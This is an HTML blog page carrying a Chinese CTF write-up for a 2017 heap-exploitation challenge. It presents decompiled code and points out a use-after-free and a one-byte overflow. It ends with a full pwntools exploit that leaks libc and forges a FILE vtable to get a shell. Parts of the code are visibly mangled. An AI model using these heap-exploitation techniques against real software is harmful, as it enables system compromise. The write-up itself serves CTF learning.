@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="##0x01·逆向
+
+程序提供6个选单其中多个函数不可重入main函数  存在一个输出点
+create()函数 不可冲入
+    __int64 create_400C3A()
+{
+  _DWORD *v1; // [sp+10h] [bp-F0h]@2
+  char s; // [sp+20h] ">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="greyd0g">
+    
+
+    <!-- Title -->
+    
+    <title>cuit_2017_pwn400 | welcome to my heart!</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+
+    <!-- Content -->
+    <section class="article-container">
+<!-- Back Home -->
+<a class="nav-back" href="/">
+    <i class="fa fa-puzzle-piece"></i>
+</a>
+
+<!-- Page Header -->
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>cuit_2017_pwn400</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>##0x01·逆向</p>
+<p><img src="/2017/10/03/cuit-2017-pwn400/./1497344209753.png" alt="Alt text"></p>
+<p>程序提供6个选单<br>其中多个函数不可重入<br>main函数  存在一个输出点</p>
+<p>create()函数 不可冲入</p>
+<pre><code>    __int64 create_400C3A()
+{
+  _DWORD *v1; // [sp+10h] [bp-F0h]@2
+  char s; // [sp+20h] [bp-E0h]@5
+  __int64 v3; // [sp+F8h] [bp-8h]@1
+  v3 = *MK_FP(__FS__, 40LL);
+  if ( second_6021B8 )#重入条件判断 位于bss段
+  {
+    puts("You can only post one Crowdfunding");
+  }
+  else
+  {
+    second_6021B8 = 1;
+    v1 = calloc(0x18uLL, 1uLL);
+    if ( !v1 )
+      exit(0);
+    if ( !name_6020D8 )
+    {
+      puts("well,give me your name pls.");
+      input_400B11(&s, 0xC8u);
+      if ( strlen(&s) > 0x18 )#由name的长度决定存放位置
+      {
+        name_6020D8 = strdup(&s);
+      }
+      else
+      {
+        memcpy(&byte_6020C0, &s, 0x14uLL);
+        name_6020D8 = &byte_6020C0;#注意这个指针在bss段附近指针
+      }
+      if ( !name_6020D8 )
+        exit(0);
+    }
+    puts("How many seconds would you want to Crowdfund?");
+    *v1 = sub_400BC6();
+    printf("+%ds!\n", *v1);
+    v1[2] = aIfAManIsWillin;
+    v1[4] = 0;
+    ptr = v1;
+  }
+  return *MK_FP(__FS__, 40LL) ^ v3;
+}
+</code></pre>
+bss段指针分布 可以发现存放name值附近有name指针
+<pre>
+.data:00000000006020A0 ; Segment type: Pure data
+.data:00000000006020A0 ; Segment permissions: Read/Write
+.data:00000000006020A0 ; Segment alignment '32byte' can not be represented in assembly
+.data:00000000006020A0 _data           segment para public 'DATA' use64
+.data:00000000006020A0                 assume cs:_data
+.data:00000000006020A0                 ;org 6020A0h
+.data:00000000006020A0                 align 40h
+.data:00000000006020C0 byte_6020C0     db 31h                  ; DATA XREF: sub_400A16+4w
+.data:00000000006020C0                                         ; create_400C3A+D7o ...
+.data:00000000006020C1                 db    0
+.data:00000000006020C2                 db    0
+.data:00000000006020C3                 db    0
+.data:00000000006020C4                 db    0
+.data:00000000006020C5                 db    0
+.data:00000000006020C6                 db    0
+.data:00000000006020C7                 db    0
+.data:00000000006020C8                 db    0
+.data:00000000006020C9                 db    0
+.data:00000000006020CA                 db    0
+.data:00000000006020CB                 db    0
+.data:00000000006020CC                 db    0
+.data:00000000006020CD                 db    0
+.data:00000000006020CE                 db    0
+.data:00000000006020CF                 db    0
+.data:00000000006020D0                 db    0
+.data:00000000006020D1                 db    0
+.data:00000000006020D2                 db    0
+.data:00000000006020D3                 db    0
+.data:00000000006020D4                 db    0
+.data:00000000006020D5                 db    0
+.data:00000000006020D6                 db    0
+.data:00000000006020D7                 db    0
+.data:00000000006020D8 name_6020D8     dq 1                    ; DATA XREF: sub_400A16+Bw
+.data:00000000006020D8                                         ; create_400C3A:loc_400CB6r ...
+.data:00000000006020E0 aIfAManIsWillin db 'If a man is willing to sacrifice his life for the interests of hi'
+.data:00000000006020E0                                         ; DATA XREF: create_400C3A+160o
+.data:00000000006020E0                 db 's country, he will never mind things concerning his personal fort'
+.data:00000000006020E0                 db 'unes and misfortunes.',0Ah
+.data:00000000006020E0                 db 'Man I',27h,'m gonna donate all my seconds to our Holy Toad Empyre!',0
+.data:00000000006021B5                 align 8
+.data:00000000006021B8 second_6021B8   dd 1                    ; DATA XREF: sub_400A16+16w
+.data:00000000006021B8                                         ; create_400C3A+3Ar ...
+.data:00000000006021BC                 align 20h
+.data:00000000006021C0 ; void *ptr
+.data:00000000006021C0 ptr             dq 1                    ; DATA XREF: sub_400A16+20w
+.data:00000000006021C0                                         ; create_400C3A+196w ...
+.data:00000000006021C8 ; FILE *qword_6021C8
+.data:00000000006021C8 qword_6021C8    dq 1                    ; DATA XREF: sub_400A16+2Bw
+.data:00000000006021C8                                         ; save_400FF9+9Er ...
+.data:00000000006021D0 advise_6021D0   dd 1                    ; DATA XREF: sub_400A16+36w
+.data:00000000006021D0                                         ; save_400FF9+16r ...
+.data:00000000006021D0 _data           ends
+.data:00000000006021D0
+.bss:00000000006021E0 ; ===========================================================================
+.bss:00000000006021E0
+.bss:00000000006021E0 ; Segment type: Uninitialized
+.bss:00000000006021E0 ; Segment permissions: Read/Write
+.bss:00000000006021E0 _bss            segment para public 'BSS' use64
+.bss:00000000006021E0                 assume cs:_bss
+.bss:00000000006021E0                 ;org 6021E0h
+.bss:00000000006021E0                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
+.bss:00000000006021E0                 public stdout
+.bss:00000000006021E0 ; FILE *stdout
+.bss:00000000006021E0 stdout          dq ?                    ; DATA XREF: init400A59+27r
+.bss:00000000006021E0                                         ; Copy of shared data
+.bss:00000000006021E8                 align 10h
+.bss:00000000006021F0                 public stdin
+.bss:00000000006021F0 ; FILE *stdin
+.bss:00000000006021F0 stdin           dq ?                    ; DATA XREF: init400A59+13r
+.bss:00000000006021F0                                         ; Copy of shared data
+.bss:00000000006021F8 byte_6021F8     db ?                    ; DATA XREF: sub_4009D0r
+.bss:00000000006021F8                                         ; sub_4009D0+13w
+.bss:00000000006021F9                 align 20h
+.bss:00000000006021F9 _bss            ends
+.bss:00000000006021F9
+</pre>
+edit函数  可重入
+ <pre><code>
+  int edit_400DFA()
+{
+  int result; // eax@2
+  unsigned int v1; // eax@5
+  if ( ptr )
+  {
+    if ( second_6021B8 )
+    {
+      puts("inputs seconds:");
+      v1 = sub_400BC6();
+      *ptr = v1;
+      result = printf("Ok,the Crowdfunding is +%ds now!", v1);
+    }
+    else
+    {
+      result = puts("No Crowdfunding to edit!");
+    }
+  }
+  else
+  {
+    result = puts("No Crowdfunding to edit!");
+  }
+  return result;
+}
+</code></pre>
+delete（）函数 可冲入
+<pre><code>
+ int delte_400E6C()
+{
+  int result; // eax@2
+
+  if ( ptr )
+  {
+    if ( second_6021B8 )
+    {
+      free(ptr);#free后没有清空ptr 存在uaf
+      result = puts("OK,the Crowdfunding is deleted!");
+    }
+    else
+    {
+      result = puts("No Crowdfunding to delete!");
+    }
+  }
+  else
+  {
+    result = puts("No Crowdfunding to delete!");
+  }
+  return result;
+}
+</code></pre>
+show（）函数 只有单纯显示功能
+    int show_400EBA()
+{
+  name_6020D8 = 0LL;
+  return printf("Aha We have already have +%d seconds", second_6021B8);
+}
+submit（）函数 可重入 可控制fastbin的申请
+
+<pre><code>  __int64 submit_400EE3()
+{
+  char buf; // [sp+Fh] [bp-41h]@3
+  char *v2; // [sp+10h] [bp-40h]@1
+  char *v3; // [sp+18h] [bp-38h]@1
+  char s[8]; // [sp+20h] [bp-30h]@1
+  __int64 v5; // [sp+28h] [bp-28h]@1
+  __int64 v6; // [sp+30h] [bp-20h]@1
+  __int64 v7; // [sp+38h] [bp-18h]@1
+  __int64 v8; // [sp+40h] [bp-10h]@1
+  __int64 v9; // [sp+48h] [bp-8h]@1
+  v9 = *MK_FP(__FS__, 40LL);
+  *s = 0LL;
+  v5 = 0LL;
+  v6 = 0LL;
+  v7 = 0LL;
+  v8 = 0LL;
+  v2 = 0LL;
+  v3 = 0LL;
+  if ( second_6021B8 )
+  {
+    puts("Are you sure submit this post?(Y/N)");
+    read(0, &buf, 1uLL);
+    if ( buf == 'Y' )
+    {
+      puts("Pls give me your e-mail address");
+      input_400B11(s, 0x28u);
+      v2 = strdup(s);
+      if ( !v2 )
+        exit(0);
+      puts("OK,e-mail has already posted\nThe last step is do you want to leave some message?");
+      input_400B11(s, 0x28u);
+      v3 = strdup(s);
+    }
+  }
+  else
+  {
+    puts("No frame to submit!");
+  }
+  return *MK_FP(__FS__, 40LL) ^ v9;
+}
+</code>
+</pre>
+
+<p>save（）函数  可两次重入</p>
+<pre>
+<code>
+void save_400FF9()
+{
+  _BYTE v0[12]; // [sp+Ch] [bp-14h]@3
+  void *v1; // [sp+18h] [bp-8h]@5
+  if ( second_6021B8 )
+  {
+    if ( advise_6021D0 > 1 )#初始值为0  比赛时没注意到
+    {
+      puts("Sorry,You have already leave advise!");
+    }
+    else
+    {
+      ++advise_6021D0;
+      puts("Pls input advise size:");
+      *v0 = sub_400BC6();
+      if ( *v0 > 0x20 && *v0 <= 1023="" )="" {="" puts("pls="" input="" tiltle");="" v1="malloc(0x28uLL);#申请大小正好" *&v0[4]="malloc(*v0);" if="" (="" !qword_6021c8="" )#file结构体="" 分配后就不再改动="" qword_6021c8="fopen(" .="" database","="" "a+");="" input_400b11(v1,="" 0x30u);#发生一个字节溢出="" 可改变下一个堆大小="" your="" advise");="" input_400b11(*&v0[4],="" *v0="" -="" 16);="" printf("ok!(advise="" allocate="" on="" 0x%x)",="" *&v0[4]);#给出来堆地址="" fwrite(*&v0[4],="" 1ull,="" 16,="" qword_6021c8);="" free(*&v0[4]);="" }="" else="" puts("if="" you="" want="" to="" leave="" advise,pls="" create="" crowdfunding="" first");="" <="" code="">
+</=></code></pre>
+
+<p>##0x02.pwn</p>
+<p>题目存在两处漏洞，fastbin的uaf可以用来做fastbin attack，由于没有合适的size只能利用来做leak。因为输出点是用%s输出，所以如果函数地址以00结尾会，丢掉1bit。<br>第二出的一字节溢出可以用来做overlapping，第二次重入,申请足够大的内存，拿到file结构体，伪造需虚表指针指向我们在堆上伪造的续表。<br>思路：<br>1.create时使用产犊Alt text小于0x18的串在指针name前放置0x21为fastbin attack做准备<br>2.free掉ptr指针，ptr释放后没有清空<br>3.利用submit拿到name指针，修改name指针为got表指针，完成leak libc基址<br>关于两个知识点：<br>1.单字节溢出的利用<br>单字节溢出可改变下一个堆头，从而欺骗malloc和free对操作堆快的大小产生错误的判断，从而拿到相邻堆快内的地址，从而对相邻堆快进行读写。<br>分配条件size+0x4字节（x86）sieze+0x8(x64)<br><img src="/2017/10/03/cuit-2017-pwn400/./无标题.png" alt="image"><br>通过溢出A，改变B的大小。从而获得c的空间<br>2.file结构体的利用<br>在文件操作时都会产生file结构体和缓冲区，而file结构体最后一个字节是一个指向需表的指针，所有的文件操作函数，最后都会通过这个续表指针跳转到相应的地址进行处理。<br><img src="/2017/10/03/cuit-2017-pwn400/./1497347382424.png" alt="Alt text"></p>
+<p><img src="/2017/10/03/cuit-2017-pwn400/./1497362655540.png" alt="Alt text"></p>
+<p>最终exp如下：</p>
+<pre><code>
+from pwn import *
+local = 1
+slog =1
+debug =1
+if local:
+    p = process('./pwn400')#, env={"LD_PRELOAD":"./libc.so.6_pwn400"})
+else:
+    p = remote('119.29.87.226',50004)#nc 119.29.87.226 50004
+if slog:context.log_level = 'debug'
+
+elf  = ELF('./pwn400')
+puts_offset = 0x6fd60
+system_offset = 288144
+def create(name,secondes):
+    p.recvuntil('=============================\n')
+    p.sendline('1')
+    p.recvuntil('ell,give me your name pls.\n')
+    p.sendline(name)
+    p.recvuntil('How many seconds would you want to Crowdfund?\n')
+    p.sendline(secondes)
+def edit(secondes):
+    p.recvuntil('=============================\n')
+    p.sendline('2')
+    p.recvuntil('inputs seconds:\n')
+    p.sendline(secondes)
+
+def delte():
+    p.recvuntil('=============================\n')
+    p.sendline('3')
+def show(secondes):
+    p.recvuntil('=============================\n')
+    p.sendline('4')
+def submit(email,message):
+    p.recvuntil('=============================\n')
+    p.sendline('5')
+    p.recvuntil('Are you sure submit this post?(Y/N)\n')
+    p.send('Y')
+    p.sendline(email)
+    p.recvuntil('The last step is do you want to leave some message?\n')
+    p.sendline(message)
+
+def save(title,size,advise):
+    p.recvuntil('=============================\n')
+    p.sendline('6')
+    p.recvuntil('Pls input advise size:\n')
+    p.sendline(size)
+    p.recvuntil('Pls input tiltle\n')
+    p.sendline(title)
+    p.recvuntil('Pls input your advise\n')
+    p.sendline(advise)
+def pwn():
+    padding = '\x00'*8+'\x21'
+    create(padding,p64(0x00))
+    delte()
+    edit(str(0x6020c0))
+    submit(p64(0x602018),'AAAAAAAA'+p64(0x602020))
+    p.sendline('22')
+    p.recvuntil('Dear ')
+    puts = p.recvuntil(',')[:-1]
+    puts = u64(puts+'\x0##0'+'\x00')
+    libc_addr = puts-puts_offset
+    system = libc_addr+system_offset
+    log.info('puts address is '+hex(puts))
+    log.info('libc address is '+hex(libc_addr))
+    log.info('system is '+hex(system))
+    gdb.attach(p,open('debug'))
+    delte()#因为前面用fastbin泄漏地址时fastbin链表里存有错误地址
+    edit(p64(0))#这里再次利用uaf将fastbin链表恢复正常
+    save('A'*0x28+p64(0x271),str(40),'BBBBBBBB')
+    p.recvuntil("Advise allocate on ")
+    addr = p.recvuntil(")")[:-1]
+    print addr
+    addr = int(addr,16)
+    log.info('fake heap is ' +hex(addr))
+    file = '/bin/sh\x00'+p64(0x7fa21f083000)*4+p64(0x7fa21f083018)+p64(0x7fa21f083400)+p64(0x00007fa21f083000)+p64(0x00007fa21f083400)+p64(0)*4+p64(0x4141414141)+p64(system)+p64(0)*2+p64(addr+0xe0+0x30)+p64(0xffffffffffffffff)+p64(0)+p64(addr+0xf0+0x30)+p64(0)*3+p64(0x00000000ffffffff)+p64(0)*2+p64(addr+0x68)+p64(0)*42+p64(addr+0x68+0x200)+p64(system)*121#file结构体和伪造的续表
+    save('AAAAA',str(1023),file)
+    p.interactive()
+pwn()
+enter code here
+<code></code></code></pre>
+
+<p>参考链接：</p>
+<p><a href="http://bobao.360.cn/learning/detail/3113.html#特么都是出题人的" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3113.html#特么都是出题人的</a></p>
+<p><a href="http://bobao.360.cn/learning/detail/3167.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3167.html</a></p>
+
+ 
+                <!-- Meta -->
+                <div class="post-meta">
+                    <hr>
+                    <br>
+                    <div class="post-tags">
+                        
+                    </div>
+                    <div class="post-date">
+                        2017 年 10 月 03 日
+                    </div>
+                </div>
+            </div>
+
+            <!-- Comments -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <!-- Disqus Comments -->
+
+
+            </div>
+        </div>
+    </div>
+</article>
+</section>
+
+    <!-- Scripts -->
+    <!-- jQuery -->
+<script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<!-- Bootstrap -->
+<script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<script type="text/javascript">
+	console.log('Hexo-theme-hollow designed by zchen9 🙋 © 2015-' + (new Date()).getFullYear());
+</script>
+
+    <!-- Google Analytics -->
+    
+
+</body>
+
+</html>
